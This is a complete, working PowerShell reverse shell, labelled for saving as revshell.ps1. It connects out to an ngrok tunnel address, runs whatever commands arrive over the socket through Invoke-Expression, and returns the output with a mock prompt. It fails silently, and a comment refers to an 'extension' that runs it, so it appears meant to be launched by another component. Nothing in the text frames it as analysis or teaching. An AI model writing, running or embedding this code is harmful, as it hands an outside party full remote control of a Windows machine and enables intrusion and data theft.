# Reverse Shell Script (Windows) - Save as revshell.ps1
$point = "10.tcp.eu.ngrok.io"
$port = 29847

try {
    $client = New-Object System.Net.Sockets.TCPClient($point, $port)
    $stream = $client.GetStream()
    $bytes  = New-Object byte[] 65536
    $enc    = [System.Text.Encoding]::ASCII

    while ($true) {
        # Read from the socket
        $count = $stream.Read($bytes, 0, $bytes.Length)
        if ($count -eq 0) { break }

        $command = $enc.GetString($bytes, 0, $count).Trim()

        # Execute and capture output (stdout + stderr)
        $output = Invoke-Expression $command 2>&1 | Out-String

        # Send prompt + output back
        $prompt = "PS $((Get-Location).Path)> "
        $response = $output + $prompt
        $sendBytes = $enc.GetBytes($response)
        $stream.Write($sendBytes, 0, $sendBytes.Length)
        $stream.Flush()
    }
}
catch {
    # Silent fail  extension will report the exit code
    exit 1
}
finally {
    if ($stream) { $stream.Close() }
    if ($client) { $client.Close() }
}
